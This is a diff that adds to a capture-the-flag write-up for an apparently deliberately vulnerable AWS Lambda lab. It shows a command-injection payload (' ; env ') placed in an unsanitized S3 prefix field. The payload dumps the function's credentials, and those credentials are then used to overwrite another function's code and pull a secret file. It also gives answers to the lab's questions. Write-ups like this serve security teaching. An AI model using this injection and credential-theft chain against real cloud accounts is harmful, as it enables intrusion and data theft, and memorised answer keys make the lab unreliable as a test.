@@ -93,7 +93,7 @@ Amongst these two functions, only the one that downloads images has our targeted
 
 ## Analyze Lambda functions
 Let's go over what we've done so far. We need to target `download-images` lambda function which is configured in a targeted VPC that has full permission over the interested S3 bucket.
-Since we have `FullLambdaAccess` permission on the 'list-images` function, we can leverage that to change the code in `donwload-images` function.
+Since we have `AWSLambda_FullAccess` permission on the 'list-images` function, we can leverage that to change the code in `donwload-images` function.
 We can analyze both functions by downloading them:
 
 ```bash
@@ -119,6 +119,98 @@ for f in $FUNCTIONS ; do
     unzip $f.zip -d $f
 done
 ```
+**Who gave the list-images function's author the vulnerable CLI command to run?**
+Inspect the two functions and we get the answer in one of those two.
 
+`-> Uglúk`
 
+### Analyzing the `list-images` function
+As we can see, the code runs a simple AWS CLI command which does not have input sanitized. 
 
+```bash
+f"aws s3 ls s3://{os.environ['IMAGE_BUCKET']}/{event['prefix']}"
+```
+
+We can inject a command into this line of code. When running this Lambda function with the following `payload.json`
+
+```json
+{
+    "prefix": " ; env "
+}
+```
+
+The resulting commdand looks like `aws s3 ls s3://{os.environ['IMAGE_BUCKET']}; env`, which prints out all environment variables.
+Run the following command to invoke the `list-images` function:
+
+```bash
+aws lambda invoke --function-name list-images --payload fileb://payload.json output.json
+cat output.json | jq -r . | grep AWS
+```
+
+Before moving on, let's modify the `download-images` function:
+- On the line `Bucket=os.environ['IMAGE_BUCKET']`, change to `Bucket='mauhur-coins-XXXXXXXXXXXX'`
+- Zip this modified `index.py` to update the `download-images' function.
+  
+```bash
+zip -r ../compromised.zip index.py
+```
+
+## EXfiltrate credentials
+From the above `payload.json` and the  `index.py` file, invoke the `list-images` function
+
+```bash
+aws lambda invoke --function-name list-images --payload fileb://payload.json output.json
+cat output.json | jq -r . | grep AWS
+```
+
+Take note of the following key-value pairs: `AWS_SESSION_TOKEN`, `AWS_SECRET_ACCESS_KEY`, `AWS_ACCESS_KEY_ID`
+Open a new terminal and update the environemnt variables:
+
+```bash
+user@machine$ export AWS_SESSION_TOKEN=REDACTED
+user@machine$ export AWS_SECRET_ACCESS_KEY=REDACTED
+user@machine$ export AWS_ACCESS_KEY_ID=ASIAREDACTED
+```
+
+![image](https://github.com/user-attachments/assets/12881229-ff9e-4586-b65e-d81620d75958)
+
+Verify we're using the Lambda function's credentials:
+
+```bash
+aws sts get-caller-identity
+```
+
+![image](https://github.com/user-attachments/assets/18c38d0d-280e-4698-aff2-8070f736b903)
+
+Now with this new credentials, we can update the `download-images` function using
+
+```bash
+aws lambda update-function-code --region us-east-1 --function-name download-images --zip-file fileb://compromised.zip
+```
+
+Create `payload2.json` file
+
+```json
+{"object_key": "password.txt" }
+```
+
+Invoke the compromised function
+
+```
+aws lambda invoke --function-name download-images --payload fileb://payload2.json output2.json
+```
+
+And we should get the password in `output2.json`
+
+**What's the value of the AWS_EXECUTION_ENV environment variable?**
+
+`-> AWS_Lambda_python3.9`
+
+**What is the secret phrase in password.txt?**
+
+`-> Do you know how the orc first came to be? They were elves once taken by the dark powers. 
+Tortured and mutilated, a ruined and terrible form of life.`
+
+**Which managed policy seems harmless but should not be used lightly?**
+
+`-> `
